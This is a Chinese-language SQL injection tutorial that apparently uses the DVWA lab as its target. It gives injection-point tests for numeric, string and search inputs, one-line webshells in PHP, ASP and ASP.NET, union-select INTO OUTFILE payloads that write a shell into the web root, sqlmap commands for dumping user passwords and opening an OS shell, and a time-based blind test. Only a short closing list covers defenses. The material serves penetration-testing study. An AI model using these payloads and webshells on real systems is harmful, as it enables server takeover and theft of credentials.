    SQLInject漏洞

    注入漏洞，主要指数据库注入漏洞
    数据库注入漏洞，主要是开发人员在构建代码时，没有对输入边界进行过滤或过滤不足，导致攻击者可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库对其进行执行，导致数据库信息泄露的一种漏洞。

    攻击流程：

    • 注入点发现
      • 主动方式：直接使用工具扫描
      • 手动构造sql语句（需要经验）
    • 获取信息
      • 环境信息：数据库类型、数据库版本、操作系统版本、用户信息
      • 数据库信息：数据库名称、数据库表、表字段、字段内容
    • 获取权限
      • 获取操作系统权限：通过数据库执行shell，上传木马

    SQL注入类型

    数字型

    例：user_id=$id

    注入点判断：http://wwww.xxx.com/?id=1
    提交1正常
    select * from tablename where id=1;
    提交1 and 1=1
    select * from tablename where id=1 and 1=1;
    提交1 and 1=2
    select * from tablename where id=1 and 1=2;
    单引号测试’
    select * from tablename where id=‘;

    字符型

    例：user_id=’$id’

    注入点判断：http://wwww.xxx.com/?id=2
    提交2正常
    select * from tablename where id=’2’;
    提交2 and 1=1
    select * from tablename where id=’2 and 1=1‘;
    提交2’ and 1=1–
    select * from tablename where id=’2’ and 1=1–‘;
    提交2’ and 1=2–
    select * from tablename where id=’2’ and 1=2–‘;
    单引号测试’
    select * from tablename where id=’‘‘;

    搜索型

    例：text LIKE ‘%{$_GET[‘search’]}%’

    注入点判断：http://wwww.xxx.com/search.php?search=1

    提交1正常
    select * from comment where comment_tex like ‘%1%’;
    提交1%’ and 1=1– 或 1%’ and ‘%1%’ = ‘%2
    select * from comment where comment_tex like ‘%1%’ and 1=1–%’;
    select * from comment where comment_tex like ‘%1%’ and ‘%1%’ = ‘%2%’;

    总的来说：对sql中的各种类型的输入进行闭合测试，构造合法sql语句，欺骗后台执行。

    手工开撸之get shell

    知识补充：一句话木马
    一句话木马是一种短小精悍的木马客户端，隐蔽性号，功能强大
    例：
    php:<?php @eval($_POST[‘cmd’])?>
    asp:<%eval request(‘cmd’)%>
    asp.net:<%@ Page Language=’Jscript’%><%eval(Request.Item[‘cmd’],’unsafe’);%>

    连接工具可以用中国菜刀，中国蚁剑等等

    这里我们可以通过上传后门，通过控制后门来得到shell
    例如：
    <?system($_REQUEST[‘cmd’]);?> //通过request提交，执行shell
    <?php eval($_POST[‘123’]);?> //PHP一句话木马，用工具连接即可

    这里我们可以构造如下语句
    -1’ union select 1,”<?php @system($_REQUEST[‘cmd’]);?>” into outfile “C:\\wamp\\www\\dvwa\\a.php”;#
    -1’ union select “<?”,”php @system($_REQUEST[‘cmd’]);?>” into outfile “C:\\wamp\\www\\dvwa\\a.php”;#
    这两句是一样的，后一句只是对语句进行了拆分，里面的逗号会变为一个空格。
    system()这个函数可以执行系统命令，即将传入的参数内容当作系统命令来执行

    sqlmap的简单使用

    使用经典6步法

    1. -u “xxx” –cookie=”yyy” //带上cookie对URL进行注入
    2. -u “xxx” –cookie=”yyy” -current-db //对数据库名进行获取
    3. -u “xxx” –cookie=”yyy” -D dvwa –tables //对数据库dvwa的表名进行枚举
    4. -u “xxx” –cookie=”yyy” -D dvwa -T users –columns //对dvwa库里的名为users表的列名进行枚举
    5. -u “xxx” –cookie=”yyy” -D dvwa -T users -C name,password –dump //探测user表的name和password字段，如果此时得到的密码为密文，sqlmap会自动询问，是否爆破
    6. -u “xxx” –cookie=”yyy” –os-shell //获取shell，选择后台语言

    一些补充：

    • -v x //x=0~6,不同级别显示不同程度的过程信息，数值越大，越详细
    • –dbs //列出所有数据库
    • –users //显示当前登录的用户
    • –purge-output //清除之前的缓存日志
    • –password //对跑出来的密码进行枚举

    盲注

    后台关闭了错误回显，对于渗透人员来说，因为无法看到反馈信息，而无法直接进行判断。
    这种情况下，注入点仍然存在，只是手动利用起来非常麻烦

    使用sleep来进行基于时间的判断：
    1’ and sleep(3)#

    先输入一个’来测试

    发现没有返回报错信息，而是显示这个id不存在
    当输入1' and sleep(3)#发现页面3秒后才响应，说明是执行了sleep这个函数的
    这里手工注入太耗时，还是直接上sqlmap就行了

    sql注入防范措施

    • 代码层面
      • 对输入进行严格的转义和过滤
      • 使用参数化，不直接将用户输入拼接到sql语句中。
    • 网络层面
      • 通过waf设备（安全狗、D盾之类的）
      • 云端防护（如果找到服务器真实ip后可以绕过）
